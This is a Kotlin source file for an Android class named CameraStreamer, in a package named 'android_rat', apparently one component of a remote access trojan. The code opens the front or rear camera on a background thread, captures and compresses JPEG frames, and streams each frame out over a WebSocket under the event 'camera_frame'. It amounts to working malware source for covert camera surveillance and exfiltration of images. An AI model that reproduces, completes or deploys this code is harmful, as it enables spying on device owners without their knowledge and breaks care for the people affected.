package com.example.android_rat.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.app.ActivityCompat
import java.io.ByteArrayOutputStream

class CameraStreamer(
    private val context: Context,
    private val cameraSize: Size = Size(320, 240)
) {
    private var imageReader: ImageReader? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var cameraManager: CameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null

    @Volatile
    private var isStreaming: Boolean = false

    fun startStreaming(isFrontCamera: Boolean) {
        stopStreaming()  // Stop the previous stream
        Handler(Looper.getMainLooper()).postDelayed({
            registerNetworkCallback()  // Register network listener for connection status
            startBackgroundThread()  // Start background thread

            if (imageReader == null) {
                imageReader = ImageReader.newInstance(
                    cameraSize.width, cameraSize.height, ImageFormat.JPEG, 2
                ).apply {
                    setOnImageAvailableListener({ reader ->
                        processImage(reader.acquireLatestImage())  // Process images as they are available
                    }, backgroundHandler)
                }
            }

            openCamera(isFrontCamera)  // Open the camera
        }, 1000)  // 500 ms delay before switching
    }


    private fun registerNetworkCallback() {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkRequest = NetworkRequest.Builder().build()

        connectivityManager.registerNetworkCallback(networkRequest, object : ConnectivityManager.NetworkCallback() {
            override fun onLost(network: Network) {
                Log.d("CameraStreamer", "Internet disconnected, stopping streaming...")
                stopStreaming()  // Clean up camera resources on internet loss
            }

            override fun onAvailable(network: Network) {
                Log.d("CameraStreamer", "Internet reconnected.")
                // Optional: handle reconnection logic
            }
        })
    }

    fun stopStreaming() {
        try {
            isStreaming = false
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
            backgroundThread?.quitSafely()
            backgroundThread = null
            backgroundHandler = null

            Log.d("CameraStreamer", "Streaming stopped and resources released.")
        } catch (e: Exception) {
            Log.e("CameraStreamer", "Error stopping stream: ${e.message}")
        }
    }

    private fun startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = HandlerThread("CameraStreamerBackgroundThread").apply {
                start()
                backgroundHandler = Handler(looper)
            }
        }
    }

    private fun openCamera(isFrontCamera: Boolean) {
        try {
            val cameraId = if (isFrontCamera) {
                getCameraId(CameraCharacteristics.LENS_FACING_FRONT)
            } else {
                getCameraId(CameraCharacteristics.LENS_FACING_BACK)
            }

            if (cameraId != null && ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, cameraStateCallback, backgroundHandler)
            } else {
                Log.e("CameraStreamer", "Camera permissions not granted.")
            }
        } catch (e: CameraAccessException) {
            Log.e("CameraStreamer", "Error accessing camera: ${e.message}")
            stopStreaming()  // Stop streaming in case of error
        }
    }

    private fun getCameraId(facing: Int): String? {
        return cameraManager.cameraIdList.firstOrNull { id ->
            val characteristics = cameraManager.getCameraCharacteristics(id)
            characteristics.get(CameraCharacteristics.LENS_FACING) == facing
        }
    }

    private val cameraStateCallback = object : CameraDevice.StateCallback() {
        override fun onOpened(camera: CameraDevice) {
            cameraDevice = camera
            setupCameraCaptureSession(imageReader?.surface ?: return)
        }

        override fun onDisconnected(camera: CameraDevice) {
            Log.e("CameraStreamer", "Camera disconnected.")
            stopStreaming()  // Stop streaming when camera is disconnected
        }

        override fun onError(camera: CameraDevice, error: Int) {
            Log.e("CameraStreamer", "Error opening camera: $error")
            stopStreaming()  // Stop streaming on error
        }
    }

    private fun setupCameraCaptureSession(surface: Surface) {
        try {
            val surfaces = listOf(surface)
            cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    createCaptureRequest(session, surface)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e("CameraStreamer", "Failed to configure capture session.")
                    stopStreaming()
                }
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            Log.e("CameraStreamer", "Error configuring capture session: ${e.message}")
            stopStreaming()
        }
    }

    private fun createCaptureRequest(session: CameraCaptureSession, surface: Surface) {
        try {
            val captureRequestBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)?.apply {
                addTarget(surface)
            }

            session.setRepeatingRequest(captureRequestBuilder?.build()!!, null, backgroundHandler)
        } catch (e: CameraAccessException) {
            Log.e("CameraStreamer", "Error creating capture request: ${e.message}")
            stopStreaming()
        } catch (e: NullPointerException) {
            Log.e("CameraStreamer", "NullPointerException during capture request creation: ${e.message}")
            stopStreaming()
        }
    }

    private fun processImage(image: Image?) {
        image?.use {
            try {
                val buffer = it.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)

                // Compress the image
                val compressedBytes = compressJPEG(bytes, 50)

                // Send the image over WebSocket
                sendFrameDataOverWebSocket(compressedBytes)
            } catch (e: Exception) {
                Log.e("CameraStreamer", "Error processing image: ${e.message}")
            } finally {
                image.close()
            }
        }
    }

    private fun compressJPEG(inputBytes: ByteArray, quality: Int): ByteArray {
        val bitmap = BitmapFactory.decodeByteArray(inputBytes, 0, inputBytes.size)
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
        return outputStream.toByteArray()
    }

    private fun sendFrameDataOverWebSocket(data: ByteArray) {
        WebSocketUtils.emitBytes("camera_frame", data)
    }
}
